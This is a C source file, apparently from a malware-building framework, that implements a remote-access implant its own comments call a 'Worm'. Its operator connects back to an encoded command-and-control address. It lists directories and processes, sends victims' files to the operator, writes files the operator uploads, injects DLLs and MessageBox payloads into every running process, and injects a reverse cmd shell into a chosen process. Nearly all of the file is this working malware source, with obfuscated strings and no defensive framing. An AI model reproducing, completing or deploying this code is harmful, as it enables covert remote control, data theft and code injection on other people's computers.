@@ -1,0 +1,389 @@
+#!name##DrMarioCmd_C
+#!itemType##sfile
+#!info##Dr Mario Command C file.
+#!lang##c
+#!addNameComp##True
+
+#include "drMario_cmd.h"
+#include "drMario_help.h"
+
+// COMMANDER CONSOLE ID
+int drmario_commander_console_ID = 0;
+
+// counter for download file
+int drmario_fdown_counter = 0;
+
+// IP ADDRESS
+int drmario_raw_cmd_ip_addr[] = {
+    {{_ROBBO.EncodeStr(DRM_IP)}}
+};
+
+void drMario_close_commander(pDR_MARIO_COMMANDER_CONSOLE dr_mario) {
+    dr_mario->FLAG_work = 0;
+}
+
+void drMario_cmd_pwd(pDR_MARIO_COMMANDER_MSG cmsg) {
+    char *pwd = malloc(DR_MARIO_CMD_CURRENT_DIR_BUFF);
+    memset(pwd, 0, DR_MARIO_CMD_CURRENT_DIR_BUFF);
+    sprintf(pwd, "PWD: %s", cmsg->console->currentDir);
+    rtcp_send_text_msg(cmsg->console->main_sock, pwd, 0);
+    free(pwd);
+}
+
+void drMario_cmd_change_dir(pDR_MARIO_COMMANDER_MSG cmsg) {
+    chdir(cmsg->arg1);
+    memset(cmsg->console->currentDir, 0, DR_MARIO_CMD_CURRENT_DIR_BUFF);
+    getcwd(cmsg->console->currentDir, DR_MARIO_CMD_CURRENT_DIR_BUFF);
+    drMario_cmd_pwd(cmsg);
+}
+
+void drMario_cmd_list_dir(pDR_MARIO_COMMANDER_MSG cmsg) {
+    DIR *directory;
+    struct dirent *entry;
+    size_t tSize;
+    directory = opendir(".");
+    if (directory == NULL) {
+        rtcp_send_text_msg(cmsg->console->main_sock, "ERROR Open Directory.", 0);
+        return;
+    }
+    while ((entry = readdir(directory)) != NULL) {
+        tSize += strlen(entry->d_name) + 1;
+    }
+    char *buff = malloc(tSize);
+    if (!buff) {
+        return;
+    }
+    memset(buff, 0, tSize);
+    rewinddir(directory);
+    char *pBuff = buff;
+    while ((entry = readdir(directory)) != NULL) {
+        pBuff += sprintf(pBuff, "%s\n", entry->d_name);
+    }
+    closedir(directory);
+    rtcp_send_text_msg(cmsg->console->main_sock, buff, 0);
+    free(buff);
+}
+
+void drMario_cmd_send_file(pDR_MARIO_COMMANDER_MSG cmsg) {
+    DIR *directory;
+    struct dirent *entry;
+    directory = opendir(".");
+    size_t mem_size = strlen(cmsg->console->currentDir) + strlen(cmsg->arg1) + 1;
+    while ((entry = readdir(directory)) != NULL) {
+        if (strcmp(entry->d_name, cmsg->arg1) == 0) {
+            char *target = malloc(mem_size);
+            memset(target, 0, mem_size);
+            sprintf(target, "%s\\%s", cmsg->console->currentDir, cmsg->arg1);
+            rtcp_send_file(cmsg->console->main_sock, target);
+            free(target);
+            return;
+        }
+    }
+    rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_file_not_exist, 256);
+}
+
+void drMario_cmd_find_proc_pid(pDR_MARIO_COMMANDER_MSG cmsg) {
+    if (cmsg->arg1 == NULL) {
+        rtcp_send_text_msg(cmsg->console->main_sock, "ERROR: no target.", 0);
+        return;
+    }
+    DWORD tar_pid = drMario_find_process_pid(cmsg->arg1);
+    char mBuff[128];
+    robbo_decode2(drm_help_target_pid, mBuff, 128);
+    char buff[256];
+    sprintf(buff, "%s %d", mBuff, tar_pid);
+    rtcp_send_text_msg(cmsg->console->main_sock, buff, 0);
+}
+
+void drMario_cmd_swarm_msgbox(pDR_MARIO_COMMANDER_MSG cmsg) {
+    char sbuff[128];
+    robbo_decode2(drm_help_start_injection, sbuff, 128);
+    rtcp_send_text_msg(cmsg->console->main_sock, sbuff, 0);
+    pDR_MARIO_PAYLOAD_MSGBOX payload = malloc(sizeof(DR_MARIO_PAYLOAD_MSGBOX));
+    payload->msgbox = robbo_faddr_MessageBoxA();
+    payload->pause_me = robbo_faddr_Sleep();
+    strcpy(payload->label, "DrMario");
+    strcpy(payload->text, cmsg->arg1);
+    pDR_MARIO_PROC_PID_LIST pids = drMario_get_pid_list();
+    HANDLE proc;
+    int success = 0;
+    int result;
+    size_t func_len = (char*)drMario_payload_func_msgbox_end - (char*)drMario_payload_func_msgbox;
+    for (int i=0; i<pids->size; i++) {
+        result = robbo_locust_inject_payload_basic(pids->list[i], payload, sizeof(DR_MARIO_PAYLOAD_MSGBOX), (PVOID)drMario_payload_func_msgbox, func_len);
+        if (result != 0) {
+            success++;
+        }
+    }
+    free(payload);
+    char tBuff[128];
+    robbo_decode2(drm_help_injected_proc, tBuff, 128);
+    char buff[192];
+    sprintf(buff, "%s %d", tBuff, success);
+    rtcp_send_text_msg(cmsg->console->main_sock, buff, 0);
+}
+
+void drMario_cmd_inject_dll(pDR_MARIO_COMMANDER_MSG cmsg) {
+    if (cmsg->arg1 == NULL | cmsg->arg2 == NULL) {
+        return;
+    }
+    DIR *directory;
+    struct dirent *entry;
+    directory = opendir(".");
+    size_t mem_size = strlen(cmsg->console->currentDir) + strlen(cmsg->arg1) + 1;
+    while ((entry = readdir(directory)) != NULL) {
+        if (strcmp(entry->d_name, cmsg->arg1) == 0) {
+            char *target = malloc(mem_size);
+            memset(target, 0, mem_size);
+            sprintf(target, "%s\\%s", cmsg->console->currentDir, cmsg->arg1);
+            int result = drMario_inject_dll(target, atoi(cmsg->arg2), 0);
+            if (result == 0) {
+                rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_dll_inject_succ, 256);
+            }
+            free(target);
+            return;
+        }
+    }
+    rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_file_not_exist, 256);
+    
+}
+
+void drMario_cmd_rev_tcp_app(pDR_MARIO_COMMANDER_MSG cmsg, char *app_name) {
+    if (cmsg->arg1 == NULL | cmsg->arg2 == NULL | cmsg->arg3 == NULL) {
+        rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_incomplete_cmd, 256);
+        return;
+    }
+    char ip_addr[16];
+    if (atoi(cmsg->arg1) == 0) {
+        robbo_decode2(drmario_raw_cmd_ip_addr, ip_addr, 16);
+    }
+    else {
+        strcpy(ip_addr, cmsg->arg1);
+    }
+    DWORD target_pid = atoi(cmsg->arg3);
+    pDR_MARIO_PAYLOAD_REVERSE_TCP payload = malloc(sizeof(DR_MARIO_PAYLOAD_REVERSE_TCP));
+    memset(payload, 0, sizeof(DR_MARIO_PAYLOAD_REVERSE_TCP));
+    payload->wsa_startup = rtcp_faddr_WSAStartup;
+    payload->wsa_socket = rtcp_faddr_WSASocketA;
+    payload->connect = rtcp_faddr_connect;
+    payload->close_sock = rtcp_faddr_closesocket;
+    payload->cr_proc = robbo_faddr_CreateProcessA();
+    payload->wait = robbo_faddr_WaitForSingleObject();
+    payload->si.cb = sizeof(STARTUPINFO);
+    payload->si.dwFlags = STARTF_USESTDHANDLES;
+    payload->sockaddr.sin_family = AF_INET;
+    payload->sockaddr.sin_port = rtcp_wapi_htons(atoi(cmsg->arg2));
+    payload->sockaddr.sin_addr.s_addr = rtcp_wapi_inet_addr(ip_addr);
+    payload->sockaddr_size = sizeof(struct sockaddr_in);
+    strcpy(payload->app_name, app_name);
+    size_t func_size = (char*)drMario_payload_func_rev_tcp_end - (char*)drMario_payload_func_rev_tcp;
+    size_t payload_size = sizeof(DR_MARIO_PAYLOAD_REVERSE_TCP);
+    int result = robbo_locust_inject_payload_basic(target_pid, payload, payload_size, drMario_payload_func_rev_tcp, func_size);
+    if (result == 1) {
+        rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_inject_complete, 128);
+    }
+    free(payload);
+
+}
+
+void drMario_cmd_inject_run_dll(pDR_MARIO_COMMANDER_MSG cmsg) {
+    if (cmsg->arg1 == NULL | cmsg->arg2 == NULL | cmsg->arg3 == NULL) {
+        rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_incomplete_cmd, 256);
+        return;
+    }
+    DIR *directory;
+    struct dirent *entry;
+    directory = opendir(".");
+    size_t mem_size = strlen(cmsg->console->currentDir) + strlen(cmsg->arg1) + 1;
+    while ((entry = readdir(directory)) != NULL) {
+        if (strcmp(entry->d_name, cmsg->arg1) == 0) {
+            char *target = malloc(mem_size);
+            memset(target, 0, mem_size);
+            sprintf(target, "%s\\%s", cmsg->console->currentDir, cmsg->arg1);
+            char *fexe_name = malloc(strlen(cmsg->arg3) + 1);
+            memset(fexe_name, 0, strlen(cmsg->arg3) + 1);
+            strcpy(fexe_name, cmsg->arg3);
+            int result = drMario_inject_run_dll(target, atoi(cmsg->arg2), fexe_name);
+            if (result == 0) {
+                rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_dll_inject_succ, 256);
+            }
+            free(target);
+            free(fexe_name);
+            return;
+        }
+    }
+    rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_file_not_exist, 256);
+
+}
+
+// -------------------------------- EXE COMMAND --------------------------------------------
+
+void drMario_execute_command(pDR_MARIO_COMMANDER_MSG cmsg) {
+    // Close Worm
+    if (strcmp(cmsg->main_cmd, "close") == 0) {
+        cmsg->console->stop(cmsg->console);
+        goto FREE_CMD;
+    }
+    // Help
+    if (strcmp(cmsg->main_cmd, "help") == 0) {
+        rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_main, DRM_HELP_CMD_SIZE);
+        goto FREE_CMD;
+    }
+
+    // New Console Commander
+    if (strcmp(cmsg->main_cmd, "new") == 0) {
+        if (strcmp(cmsg->arg1, "0") == 0) {
+            cmsg->arg1 = 0;
+        }
+        pDR_MARIO_COMMANDER_CONSOLE nConsole = drMario_build_commander(cmsg->arg1, atoi(cmsg->arg2));
+        nConsole->start(nConsole);
+        goto FREE_CMD;
+    }
+    // PWD
+    if (strcmp(cmsg->main_cmd, "pwd") == 0) {
+        drMario_cmd_pwd(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Change directory
+    if (strcmp(cmsg->main_cmd, "cd") == 0) {
+        drMario_cmd_change_dir(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Dir list
+    if (strcmp(cmsg->main_cmd, "dir") == 0) {
+        drMario_cmd_list_dir(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Send file
+    if (strcmp(cmsg->main_cmd, "down") == 0) {
+        drMario_cmd_send_file(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Process list
+    if (strcmp(cmsg->main_cmd, "lproc") == 0) {
+        drMario_get_proc_list(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Find process pid
+    if (strcmp(cmsg->main_cmd, "fpid") == 0) {
+        drMario_cmd_find_proc_pid(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Swarm MessageBox
+    if (strcmp(cmsg->main_cmd, "swarm_msgbox") == 0) {
+        drMario_cmd_swarm_msgbox(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Inject DLL to process
+    if (strcmp(cmsg->main_cmd, "idll") == 0) {
+        drMario_cmd_inject_dll(cmsg);
+        goto FREE_CMD;
+    }
+
+    // Reverse TCP CMD
+    if (strcmp(cmsg->main_cmd, "rev_cmd") == 0) {
+        drMario_cmd_rev_tcp_app(cmsg, "cmd");
+        goto FREE_CMD;
+    }
+
+    // Inject DLL to process and run function
+    if (strcmp(cmsg->main_cmd, "irdll") == 0) {
+        drMario_cmd_inject_run_dll(cmsg);
+        goto FREE_CMD;
+    }
+
+    // rtcp_send_text_msg(cmsg->console->main_sock, "UNKNOWN COMMAND", 0);
+    rtcp_send_robbo_text_msg(cmsg->console->main_sock, drm_help_unknown_command, 256);
+
+    FREE_CMD:
+        cmsg->clean(cmsg);
+}
+
+void drMario_process_messages(pROBBO_TCP_MESSAGES rmsg, pDR_MARIO_COMMANDER_CONSOLE dr_mario) {
+    if (rmsg->types == 1) {
+        pDR_MARIO_COMMANDER_MSG cmsg = drMario_make_commander_msg(rmsg, dr_mario);
+        drMario_execute_command(cmsg);
+    }
+    else if (rmsg->types == 2) {
+        char *fpath = malloc(DR_MARIO_CMD_CURRENT_DIR_BUFF);
+        memset(fpath, 0, DR_MARIO_CMD_CURRENT_DIR_BUFF);
+        sprintf(fpath, "%s\\my_file%d", dr_mario->currentDir, drmario_fdown_counter);
+        drmario_fdown_counter++;
+        FILE *nfile = fopen(fpath, "wb");
+        fwrite(rmsg->data, rmsg->msg_size, 1, nfile);
+        fclose(nfile);
+        free(fpath);
+        rmsg->free(rmsg);
+    }
+}
+
+void drMario_raw_start_commander(pDR_MARIO_COMMANDER_CONSOLE dr_mario) {
+    if (dr_mario->FLAG_work != 0) {
+        return;
+    }
+    rtcp_wapi_WSAStartup(0x0202, &dr_mario->wsadata);
+    dr_mario->FLAG_work = 1;
+    int disconnect_flag = 1;
+    while (dr_mario->FLAG_work != 0) {
+        if (disconnect_flag == 1) {
+            memset(&dr_mario->saddr, 0, sizeof(struct sockaddr_in));
+            dr_mario->main_sock = rtcp_sock_build_WSASocketA();
+            dr_mario->saddr.sin_family = AF_INET;
+            dr_mario->saddr.sin_addr.s_addr = rtcp_wapi_inet_addr(dr_mario->ip_addr);
+            dr_mario->saddr.sin_port = rtcp_wapi_htons(dr_mario->port_num);
+            disconnect_flag = 0;
+        }
+        int conn_result = rtcp_wapi_connect(dr_mario->main_sock, (SOCKADDR*)&dr_mario->saddr, sizeof(struct sockaddr_in));
+        if (conn_result == -1) {
+            robbo_wapi_Sleep(2000);
+            continue;
+        }
+        rtcp_send_encode_key(dr_mario->main_sock);
+        robbo_wapi_Sleep(1000);
+        rtcp_send_robbo_text_msg(dr_mario->main_sock, drm_help_intro, 256);
+        while (dr_mario->FLAG_work != 0) {
+            pROBBO_TCP_MESSAGES rmsg = rtcp_recive_data(dr_mario->main_sock);
+            if (rmsg == 0) {
+                rtcp_wapi_closesocket(dr_mario->main_sock);
+                disconnect_flag = 1;
+                break;
+            }
+            drMario_process_messages(rmsg, dr_mario);
+        }
+    }
+    rtcp_wapi_closesocket(dr_mario->main_sock);
+    free(dr_mario);
+
+}
+
+void drMario_start_commander(pDR_MARIO_COMMANDER_CONSOLE dr_mario) {
+    dr_mario->cmd_handle = robbo_wapi_CreateThread(0, 0, (LPTHREAD_START_ROUTINE)drMario_raw_start_commander, (LPVOID)dr_mario, 0, 0);
+}
+
+pDR_MARIO_COMMANDER_CONSOLE drMario_build_commander(char *ip_addr, int port_num) {
+    pDR_MARIO_COMMANDER_CONSOLE dr_mario = malloc(sizeof(DR_MARIO_COMMANDER_CONSOLE));
+    memset(dr_mario, 0, sizeof(DR_MARIO_COMMANDER_CONSOLE));
+    // Set ID
+    dr_mario->id = drmario_commander_console_ID;
+    drmario_commander_console_ID++;
+    // build sockaddr
+    if (ip_addr == 0) {
+        robbo_decode2(drmario_raw_cmd_ip_addr, dr_mario->ip_addr, 16);
+    }
+    else {
+        strcpy(dr_mario->ip_addr, ip_addr);
+    }
+    dr_mario->port_num = port_num;
+    dr_mario->start = drMario_start_commander;
+    dr_mario->stop = drMario_close_commander;
+    getcwd(dr_mario->currentDir, DR_MARIO_CMD_CURRENT_DIR_BUFF);
+    return dr_mario;
+}
+
